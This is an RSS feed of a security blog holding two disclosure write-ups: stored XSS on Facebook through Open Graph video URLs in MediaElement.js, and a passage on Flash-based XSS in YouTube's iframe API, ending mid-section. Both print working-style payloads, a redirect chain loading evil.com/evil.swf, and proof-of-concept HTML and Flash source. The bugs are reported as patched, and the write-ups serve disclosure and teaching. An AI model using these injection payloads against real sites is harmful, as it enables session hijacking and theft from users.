@@ -1,0 +1,332 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+	xmlns:georss="http://www.georss.org/georss"
+	xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+	>
+
+<channel>
+	<title>XSS &#8211; OpnSec</title>
+	<atom:link href="/tag/xss/feed/" rel="self" type="application/rss+xml" />
+	<link></link>
+	<description>Open mind Security and Crypto!</description>
+	<lastBuildDate>Fri, 30 Jul 2021 20:07:09 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.0.11</generator>
+
+<image>
+	<url>/wp-content/uploads/2017/08/cropped-opnsec-32x32.png</url>
+	<title>XSS &#8211; OpnSec</title>
+	<link></link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+<site xmlns="com-wordpress:feed-additions:1">250189475</site>	<item>
+		<title>Stored XSS on Facebook</title>
+		<link>/2018/03/stored-xss-on-facebook/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=stored-xss-on-facebook</link>
+					<comments>/2018/03/stored-xss-on-facebook/#comments</comments>
+		
+		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
+		<pubDate>Sun, 18 Mar 2018 15:41:18 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Facebook]]></category>
+		<category><![CDATA[XSS]]></category>
+		<guid isPermaLink="false">/?p=242</guid>
+
+					<description><![CDATA[tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS on Facebook wall in April 2017. These stored XSS vulnerabilities were also present in WordPress so I waited for WordPress to patch it before&#8230; <a class="read-more" href="/2018/03/stored-xss-on-facebook/">Read More</a>]]></description>
+										<content:encoded><![CDATA[<blockquote><p>tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph.</p>
+<p>When a user clicks to play the video, the XSS executes on facebook.com</p></blockquote>
+<h3>Introduction</h3>
+<p>I reported multiple stored XSS on Facebook wall in April 2017. These stored XSS vulnerabilities were also present in WordPress so I waited for WordPress to patch it before publishing this write-up. The vulnerabilities are now fixed on WordPress!</p>
+<p>These XSS are a little bit complex because they require multiple steps, but each step by itself is pretty simple to understand.</p>
+<p>&nbsp;</p>
+<h3>The Open Graph protocol</h3>
+<p>When you add a URL in a Facebook post, Facebook will use the <a href="http://ogp.me/">Open Graph protocol</a> (<a href="https://developers.facebook.com/docs/sharing/webmasters/" target="_blank" rel="noopener noreferrer">FB doc</a>) to display rich content.  Here is a summary about how Facebook uses OG to embed external content in a FB post:</p>
+<p>&nbsp;</p>
+<ol>
+<li>The attacker posts a URL on a FB post</li>
+<li>FB server fetches the URL (server side) and reads the OG meta tags to extract info about the content of the URL (for example the content is a video with a title, a cover image, a video encoding type and a video file URL)</li>
+<li>The victim views the FB post with the cover image and a play button</li>
+<li>When the victim clicks on the play button, the video loads using the video info extracted from the OG meta tags. This is when the XSS will be executed</li>
+</ol>
+<p>&nbsp;</p>
+<blockquote><p>This OG workflow is also used by many websites including Twitter and WordPress for example.<br />
+Step #2 is sensitive: server-side fetching of a user provided URL, which can often lead to SSRF.<br />
+Another potential vulnerability is Clickjacking if the hosting website uses X-Frame-Options: SAMEORIGIN on sensitive webpages and let the attacker inject arbitrary iframes on the same subdomain.</p>
+<p>FB wasn&#8217;t vulnerable to either of these issues.</p></blockquote>
+<p>The interesting part is #4 when FB loads the video after the victim clicks the play button. First, FB will send a XHR request to get the video type and the video file URL, which are both provided by the attacker in the og:video:type (we&#8217;ll call it ogVideoType) and the og:video:secure_url (ogVideoUrl) tags of the URL posted by the attacker. Here is a sample of OG meta tags:</p>
+<pre><code ></p>
+<p>&lt;!DOCTYPE html&gt;</p>
+<p>&lt;html&gt;</p>
+<p>&lt;head&gt;</p>
+<p>&lt;meta property="og:video:type" content="video/flv"&gt;</p>
+<p>&lt;meta property="og:video:secure_url" content='https://example.com/video.flv'&gt;</p>
+<p>&lt;meta property="og:video:width" content="718"&gt;</p>
+<p>&lt;meta property="og:video:height" content="404"&gt;</p>
+<p>&lt;meta property="og:image" content="https://example.com/cover.jpg"&gt;</p>
+<p>(...)</p>
+<p>&lt;/head&gt;</p>
+<p>&lt;body&gt;</p>
+<p>(...)<br />
+&lt;/body&gt;</p>
+<p>&lt;/html&gt;</p>
+<p></code></pre>
+<p>If ogVideoType is &#8220;iframe&#8221; or &#8220;swf player&#8221; then FB loads an external iframe and doesn&#8217;t handle the playing of the video. Otherwise, FB was using <a href="http://www.mediaelementjs.com/">MediaElement.js</a> to handle the loading of the video directly on facebook.com. I already reported and <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">disclosed vulnerabilities</a> on the Flash component of ME.js on both Facebook and WordPress.</p>
+<p>&nbsp;</p>
+<h2>1. Stored XSS using FlashMediaElement.swf</h2>
+<p>MediaElements.js has multiple ways of playing a video depending on ogVideoType.</p>
+<p>If ogVideoType is &#8220;video/flv&#8221; (flash video), Facebook loads the Flash file FlashMediaElement.swf on facebook.com  (using an &lt;embed&gt; tag) and passes the ogVideoUrl to FlashME.swf to play the video. FlashME.swf then sends logs information to facebook.com (using Flash-to-javascript) about events like &#8220;video played&#8221; or &#8220;video ended&#8221;. FlashME.swf handled correctly the Flash-to-javascript communication, in particular <strong>\</strong> was properly escaped to <strong>\\</strong> to avoid XSS.</p>
+<p>However, the javascript code sent was :</p>
+<pre><code >setTimeout('log("[VIDEO_URL]")', 0)</code></pre>
+<blockquote><p>In javascript setTimeout is similar to eval, it will transform a string into instructions, making it very dangerous</p></blockquote>
+<p>[VIDEO_URL] is controlled by the attacker, it&#8217;s the value of ogVideoUrl. If it contains <strong>&#8220;</strong> for example <pre><code >http://evil.com/video.flv?"[payload]</code></pre> Flash will send the following instruction to javascript:</p>
+<pre><code >setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre>
+<p>As you can see, the <strong>&#8220;</strong> in <strong>video.flv?\&#8221;payload</strong> is properly escaped so the attacker cannot escape from the setTimeout function.</p>
+<p>However, when javascript executes the setTimeout function, it will execute the following javascript instruction :</p>
+<pre><code >log("http://evil.com/video.flv?"[payload]")</code></pre>
+<p>And this time <strong>&#8220;</strong> is not escaped any more and the attacker can inject XSS!</p>
+<p>Now the question is whether Facebook escapes ogVideoUrl before passing it to FlashME.swf.</p>
+<p>First, Facebook javascript sends a XHR request to Facebook server to get the value of ogVideoType and ogVideoUrl. The value of ogVideoUrl is correctly encoded but it can contain any special character like <pre><code >https://evil.com?"'&lt;\</code></pre></p>
+<p>Then, before being sent to Flash, ogVideoUrl was transformed like this :</p>
+<pre><code >function absolutizeUrl(<span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>) {<br />
+var tempDiv = document.createElement('div');<br />
+tempDiv.innerHTML = '&lt;a href="' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>.toString().split('"').join('&amp;quot;') + '"&gt;x&lt;/a&gt;';<br />
+return tempDiv.firstChild.href;<br />
+}</p>
+<p>flashDiv.innerHTML ='&lt;embed src="FlashME.swf?videoFile=' + <span class="objectBox objectBox-text " role="presentation">encodeURI(absolutizeUrl(ogVideoUrl )) +'</span>" type="application/x-shockwave-flash"&gt;';</p>
+<p></code></pre>
+<p>The result of <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl) is URL encoded before being sent to Flash but when Flash will receive the data it will automatically URL decode it once, so we can ignore the encodeURI instruction.</span></p>
+<p><span class="objectBox objectBox-text " role="presentation">absolutizeUrl t</span>ransforms relative URL to absolute URL with the current protocol and domain of the javascript context (and if an absolute URL is provided, it returns it almost unchanged). This seems &#8220;hacky&#8221; but it seems secure enough and simple because we let the browser do the hard work. But it&#8217;s not simple when it comes to special character encoding!</p>
+<p>When initially analyzing this code, I was using Firefox, because it had great extensions like Hackbar, Tamper Data and&#8230; Firebug!</p>
+<p>In Firefox, if you try <pre><code >absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> it will return <pre><code >http://evil.com/video.flv#%22payload</code></pre> so I was stuck because in Facebook the javascript instruction sent by Flash would be <pre><code >setTimeout("log(\"http://evil.com/video.flv?%22payload\")", 0);</code></pre> which will lead to <pre><code >log("http://evil.com/video.flv?%22[payload]")</code></pre> which is NOT an XSS.</p>
+<p>&nbsp;</p>
+<p>And then I tried on Chrome and <pre><code >absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> returned <pre><code >http://evil.com/video.flv#"payload</code></pre> and <strong>\o/ YEAH!!!!!</strong></p>
+<p>Now Flash sends <pre><code >setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre> to Facebook javascript and which will lead to <pre><code >log("http://evil.com/video.flv?"[payload]")</code></pre></p>
+<p>So if ogVideoUrl is set to <pre><code >http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"</code></pre> then Facebook will execute <pre><code >log("http://evil.com/video.flv?"+alert(document.domain+" XSSed!")+"") </code></pre> and will display a nice little alert box saying &#8220;facebook.com XSSed!&#8221; <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<blockquote><p>The reason of this is that when a browser parses a URL, it will encode special characters differently depending on the browser:</p>
+<ul>
+<li>Firefox will URLencode any occurence of <strong>&#8220;</strong> in the url</li>
+<li>Chrome, up to version 64, would URLencode <strong>&#8220;</strong> EXCEPT in the hash part (= fragment) of the URL (note: in the latest version 65 of Chrome, this behaviour changed and now Chrome behaves like Firefox and will URLencode &#8221; even in the hash part</li>
+<li>IE and Edge will NOT URLencode <strong>&#8220;</strong> in the hash part NOR the search part (= query) of the URL</li>
+<li>Safari will NOT URLencode <strong>&#8220;</strong> in the hash part</li>
+</ul>
+<p>As you can see it&#8217;s not great to let the browser decide how to encode special characters in URLs in your javascript code!</p></blockquote>
+<p>I reported the vulnerability right away to Facebook and they replied the next day and told me they modified the Flash file so that it doesn&#8217;t use setTimeout any more,  the Flash would now send <pre><code >log("http://evil.com/video.flv?\"payload")</code></pre> and as you can see <strong>&#8220;</strong> is properly escaped to <strong>\&#8221;</strong> and there is no XSS any more.</p>
+<p>&nbsp;</p>
+<h2>2. Stored XSS without Flash</h2>
+<p>The previous XSS required Flash so I checked if I could find another payload without Flash.</p>
+<p>If ogVideoType was &#8220;video/vimeo&#8221;, the following code would execute</p>
+<pre><code ><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>= <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
+<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
+<p>playerDiv.innerHTML = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>+ '?api=1"&gt;&lt;/iframe&gt;';</p>
+<p></code></pre>
+<p>As you can see <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogURL) is not urlencoded before being injected to playerDiv.innerHTML, so with ogVideoUrl set to <pre><code >http://evil.com/#" onload="alert(document.domain)"</code></pre> playerDiv.innerHTML would be <pre><code >&lt;iframe src="https://player.vimeo.com/video/#" onload="alert(document.domain)" ?api=1"&gt;&lt;/iframe&gt; </code></pre></span></p>
+<p><span class="objectBox objectBox-text " role="presentation">which is again an XSS on facebook.com!</span></p>
+<p>&nbsp;</p>
+<p>I reported this on the same day the previous XSS was fixed and Facebook fixed it again in 1 day like this :</p>
+<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span></p>
+<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>= <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
+<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
+<p>playerDiv.innerHTML = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">.split('"').join('&amp;quot;')</span> + '?api=1"&gt;&lt;/iframe&gt;'</p>
+<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
+<p>Here is a video of this XSS in action :</p>
+<div class="jetpack-video-wrapper"><iframe loading="lazy" title="Facebook XSS" width="1170" height="658" src="https://www.youtube.com/embed/Q9bsKjUd1hM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>The next day, I found another vulnerable endpoint: when ogVideoType was something unknown, like &#8220;video/nothing&#8221;, Facebook would display an error message with a link to <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span> like this:</p>
+<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span>errorDiv.innerHTML = '&lt;a href="' +<span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl )</span> + '"&gt;'<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
+<p>So with the <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>payload <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>/#"&gt;&lt;img/src="xxx"onerror="alert(document.domain)<span class="objectBox objectBox-text " role="presentation"></code></pre></span> errorDiv.innerHTML would be <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>&lt;a href="/#"&gt;&lt;img src="xxx" onerror="alert(document.domain)"&gt;<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
+<p>&nbsp;</p>
+<p>I reported it to Facebook and, funny enough, Neil from Facebook WhiteHat told me he was planning to check this code the next day!</p>
+<p>&nbsp;</p>
+<h2>3. Oh, and one more thing&#8230;</h2>
+<p>Another possible ogVideoType was &#8220;silverlight&#8221;. <a href="https://www.microsoft.com/silverlight/">Silverlight</a> is a browser plugin by Microsoft and is to Flash what VBscript was to javascript.</p>
+<p>The silverlight file hosted on Facebook (silverlightmediaelement.xap) was loaded like this:</p>
+<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span></p>
+<p>params = ["file=" + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">, "id=playerID"</span>];</p>
+<p>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="' + params.join(',').split('"').join('&amp;quot;') + '" /&gt;&lt;/object&gt;';</p>
+<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
+<p>silverlightmediaelement.xap would then send log information to Facebook javascript a little bit like the Flash file did, but this time it didn&#8217;t contain <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span> but only the player id, which is another parameter sent in initParams and defined by Facebook. Silverlight would call the javascript function <strong>[id]_init()</strong> where [id] is &#8220;playerID&#8221;.</p>
+<p>In silverlight, parameters are not separated by <strong>&amp;</strong> like in urls or in Flash but by <strong>,</strong></p>
+<p>If <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>contains a <strong>,</strong> then every thing after this comma will be considered as another parameter by silverlight, which means that using the payload  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>/#,id=alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span> then silverlight be loaded like this:</p>
+<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="file=/#,id=alert(document.domain)&amp;,id=playerID" /&gt;&lt;/object&gt;'; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
+<p>Silverlight will only take into account the first occurence of id and it will set its value to  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
+<p>Silverlight will then call the following javascript :  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>alert(document.domain)&amp;_init() <span class="objectBox objectBox-text " role="presentation"></code></pre></span> which means XSS again!</p>
+<p>&nbsp;</p>
+<p>I reported it the same day and Neal replied that they would remove all the MediaElement component and replace it with a new way of handling external videos!</p>
+<p>&nbsp;</p>
+<h2>What about WordPress ?</h2>
+<p>All this vulnerable code wasn&#8217;t developed by Facebook, they used an open source library <a href="http://www.mediaelementjs.com/">MediaElementjs</a> which was (and still is) a popular module to embed video in a webpage, especially because they had a Flash fallback for older browsers. In particular, WordPress uses this module by default when handling <a href="https://codex.wordpress.org/Shortcode_API">shortcodes</a>. The vulnerabilities were also present in WordPress and allowed stored XSS in WordPress comments or in WordPress articles written by authors (in WordPress, the Author role isn&#8217;t allowed to execute javascript).</p>
+<p>I reported the vulnerabilities to WordPress to which I already reported <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">another vulnerability</a> monthes before. They informed MediaElementjs team about this and told me they were working on a fix. On February 2018 they finally released the fix for all the XSS related to MediaElementjs.</p>
+<p>&nbsp;</p>
+<h2>Conclusion</h2>
+<p>I learned a lot and had a lot of fun finding these vulnerabilities. I hope you also enjoy it!</p>
+<p>Here is some advices :</p>
+<blockquote><p>Open Graph (and alternatives like json-ld) is a great way to display rich external content on a website, but you should be careful about it (think SSRF, XSS and Clickjacking)</p>
+<p>Don&#8217;t let the browser parse URL for you in your javascript code, each browser handles it his own way and a browser can change its behavior anytime (like Chrome 64 -&gt; 65). Use white-list regex instead.</p>
+<p>Complex, dynamic XSSes that use XHR, DOM mutations, and external content will NOT be detected by automatic tools (for now). So even the most secure, high profile website can be vulnerable. Code review and debugging are the way to go for these!</p>
+<p>Don&#8217;t be afraid of large, minified, dynamic javascript source code. If you spot some potentially dangerous features on a website, you&#8217;re free to check how it is implemented!</p>
+<p>Facebook WhiteHat is a great Bug Bounty program! Thanks Neal and all the team <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p></blockquote>
+<p>Thanks for reading, and feel free to comment if something isn&#8217;t clear.</p>
+<p>&nbsp;</p>
+<p>Happy hunting !</p>
+
+<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2018%2F03%2Fstored-xss-on-facebook%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2018/03/stored-xss-on-facebook/feed/</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		<enclosure url="https://example.com/video.flv" length="606" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv#" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv#%22payload" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="867" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?" length="867" type="video/x-flv" />
+<enclosure url="http://evil.com/video.flv?%22payload" length="867" type="video/x-flv" />
+
+		<post-id xmlns="com-wordpress:feed-additions:1">242</post-id>	</item>
+		<item>
+		<title>Advanced Flash vulnerabilities in Youtube &#8211; Part 4</title>
+		<link>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube-part-4</link>
+					<comments>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/#comments</comments>
+		
+		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
+		<pubDate>Wed, 13 Sep 2017 13:51:02 +0000</pubDate>
+				<category><![CDATA[Flash]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[XSS]]></category>
+		<category><![CDATA[Youtube]]></category>
+		<guid isPermaLink="false">/?p=188</guid>
+
+					<description><![CDATA[IV. Flash based XSSes on Youtube iframe api I&#8217;m happy that people found my previous posts on Youtube Flash vulnerabilities interesting, and I will keep posting new write-ups. This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback). Youtube html5 api is called Youtube iframe api, because&#8230; <a class="read-more" href="/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/">Read More</a>]]></description>
+										<content:encoded><![CDATA[<h3>IV. Flash based XSSes on Youtube iframe api</h3>
+<p><img loading="lazy" class="alignnone size-medium wp-image-203" style="display: none;" src="/wp-content/uploads/2017/09/Youtube-iframe-Api.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2017/09/Youtube-iframe-Api.png 1133w, /wp-content/uploads/2017/09/Youtube-iframe-Api-150x150.png 150w, /wp-content/uploads/2017/09/Youtube-iframe-Api-300x146.png 300w, /wp-content/uploads/2017/09/Youtube-iframe-Api-768x375.png 768w, /wp-content/uploads/2017/09/Youtube-iframe-Api-1024x500.png 1024w, /wp-content/uploads/2017/09/Youtube-iframe-Api-640x360.png 640w" sizes="(max-width: 1px) 100vw, 1px" />I&#8217;m happy that people found my <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/">previous posts on Youtube Flash vulnerabilities</a> interesting, and I will keep posting new write-ups.<br />
+This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback).</p>
+<p>Youtube html5 api is called <a href="https://developers.google.com/youtube/iframe_api_reference" target="_blank" rel="noopener noreferrer">Youtube iframe api</a>, because the entry point is an iframe located at youtube.com/embed/[VIDEO_ID].<br />
+When the iframe loads, it will first check if the browser is able to play videos using html5, and if not it will use the Flash fallback. Until recently, it was possible to force the Flash fallback for all browsers using the URL parameter nohtml5=1. This is what we will do here.</p>
+<p>Here is the workflow of the Youtube iframe api with Flash fallback:</p>
+<p><a href="/wp-content/uploads/2017/09/Diagramme8.svg"><img loading="lazy" class="wp-image-189 aligncenter" src="/wp-content/uploads/2017/09/Diagramme8.svg" alt="" width="675" height="449" /></a></p>
+<p>If you compare with the workflow of the Youtube Flash api in <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/" target="_blank" rel="noopener noreferrer">part 1</a>, the Flash file &#8220;Youtube Wrapper&#8221; has been replaced by the iframe &#8220;Youtube Embed&#8221;, and consequently Flash to javascript api has been replaced by postMessage api and sharedEvent api has been replaced by Flash to javascript api. This should give you a sense of how Flash and javascript are very similar, only the implementation is different.</p>
+<blockquote><p>Youtube Flash api and Youtube iframe api are so similar that <a href="https://bugzilla.mozilla.org/show_bug.cgi?format=default&amp;id=769117" target="_blank" rel="noopener noreferrer">Firefox </a>, <a href="https://groups.google.com/a/chromium.org/forum/#!msg/chromium-dev/BW8g1iB0jLs/uddWuBroBAAJ" target="_blank" rel="noopener noreferrer">Chrome </a>and <a href="https://github.com/WebKit/webkit/blob/master/Source/WebCore/Modules/plugins/YouTubePluginReplacement.cpp" target="_blank" rel="noopener noreferrer">Safari </a>have implemented an interesting/weird <a href="https://github.com/whatwg/html/issues/2390" target="_blank" rel="noopener noreferrer">behaviour </a>where any &lt;object data=&#8221;youtube.com/v/[VIDEO_ID]&#8221;&gt; (Youtube Flash api) will be automatically replaced by &lt;object data=&#8221;youtube.com/embed/[VIDEO_ID]&#8221;&gt;(Youtube iframe api) where the &lt;object&gt; will actually behave as an iframe. The objective is to force old websites to switch to Youtube iframe api without making any change in the websites themselves.</p></blockquote>
+<p>To trigger a Flash based XSS on youtube.com, you have to either load a Flash file located at youtube.com directly from the address bar, or exploit any Flash file embed in a html page located at youtube.com. Here we will exploit the Flash file &#8220;Main App&#8221; which is embed in youtube.com/embed, and from there we will execute arbitrary javascript on youtube.com/embed.<br />
+When an external website embeds a Youtube iframe, it can send <a href="https://developers.google.com/youtube/iframe_api_reference#Functions" target="_blank" rel="noopener noreferrer">commands </a>to the Youtube iframe using the postMessage api such as playVideo(), pauseVideo(), etc&#8230; The Youtube iframe will then transmit the command to the Flash Main App (using the Flash to javascript api).</p>
+<p>&nbsp;</p>
+<h3>1. Flash based XSS using loadPlaylist command</h3>
+<p>One particular command is <a href="https://developers.google.com/youtube/iframe_api_reference#loadPlaylist" target="_blank" rel="noopener noreferrer">loadPlaylist()</a> which will make the Youtube iframe load a playlist. The argument of loadPlaylist() can either be a Youtube playlist ID or an array of Youtube video IDs. When using an array of Youtube video IDs, it is possible to inject arbitrary poster (thumbnail) image url for each video.<br />
+Loading an image in Flash is similar to loading an external Flash file using Loader.load(), so we could load an arbitrary Flash file using this. Main App checks if the url of the poster image is a youtube.com url and then loads the image. Now you might be aware that Google doesn&#8217;t believe that open redirections are security issues! This makes url sanitization very difficult, because you just need to provide a youtube.com url that will redirect to an arbitrary location. I didn&#8217;t find an open redirector directly on youtube.com. However, I found a youtube.com url that will redirect to any google.com url. From there it was easy to find an open redirector on google.com that would redirect to evil.com. The full url payload was <pre><code >https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf</code></pre><br />
+Once evil.swf is loaded on youtube.com/embed it can execute arbitrary javascript using the Flash to javascript api, which means XSS on youtube.com!</p>
+<blockquote><p>Note: By default only Flash file located on the same domain than the html host page can use the Flash to javascript api. But in youtube.com/embed/[VIDEO_ID] the Main App &lt;object&gt; tag contains the attribute &#8220;<a href="https://helpx.adobe.com/flash/kb/control-access-scripts-host-web.html" target="_blank" rel="noopener noreferrer">allowscriptaccess=always</a>&#8221; which means that any Flash file loaded by the Main App will be able to use the Flash to javascript api on youtube.com/embed/[VIDEO_ID]</p></blockquote>
+<p>Here is the workflow of the POC:</p>
+<p><a href="/wp-content/uploads/2017/09/Diagramme9.svg"><img loading="lazy" class="wp-image-190 aligncenter" src="/wp-content/uploads/2017/09/Diagramme9.svg" alt="" width="864" height="350" /></a></p>
+<p>evil.com/evil.html source code:</p>
+<pre><code >&lt;!DOCTYPE html&gt;<br />
+&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;!-- Youtube iframe api with forced Flash fallback --&gt;<br />
+&lt;iframe id="player" src="https://www.youtube.com/embed/?nohtml5=1"&gt;&lt;/iframe&gt;<br />
+&lt;script&gt;<br />
+// Wait 5 seconds to let the Youtube iframe fully load<br />
+setTimeout(<br />
+function(){<br />
+// Send the loadPlaylist command to the Youtube iframe using postMessage api, with the image payload<br />
+document.getElementById("player").contentWindow.postMessage('{"command":"loadPlaylist","data":[{"video_id":"xyz","iurl":"https://accounts.youtube.com/accounts/SetSID?continue=https%3A%2F%2Fwww.google.com%2Famp%2Fs%2Fevil.com%2Fevil.swf"}]}', "*");<br />
+}<br />
+, 5000);<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre>
+<p>evil.swf source code:</p>
+<pre><code >public class Main extends Sprite {<br />
+public function Main(){<br />
+// Execute arbitrary javascript on youtube.com/embed using ExternalInterface (Flash to javascript api)<br />
+ExternalInterface.call("alert", "document.domain + ' XSSed!'");<br />
+}<br />
+}</code></pre>
+<p>Attack Scenario:<br />
+Prerequisite: The victim has Flash Player enabled<br />
+1. The victim visits evil.com/evil.html<br />
+2. evil.html loads youtube.com/embed iframe<br />
+3. evil.html sends the loadPlaylist payload<br />
+4. youtube.com/embed loads evil.swf<br />
+5. evil.swf execute XSS on youtube.com/embed</p>
+<p>Mitigation:<br />
+Google patched the Main App so that it doesn&#8217;t take picture url into account in loadPlaylist arguments.</p>
+<p>Timeline:<br />
+10/05/2016 Reported to Google<br />
+10/11/2016 &#8220;Nice catch&#8221; and reward<img loading="lazy" class="alignnone wp-image-141" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="56" height="13" /><br />
+11/09/2016 Bug fixed and verified</p>
+<p>&nbsp;</p>
+<h3>2. Flash based XSS using trustedLoader Regex</h3>
+<p>In addition to public commands like playVideo() or loadPlaylist(), Youtube api has private commands that are available only if the webpage that loads the Youtube iframe is from a verified, trusted origin (like youtube.com or drive.google.com/xxx). To do this, the Main App uses a whitelist stored in a regex. The regex is like this :<br />
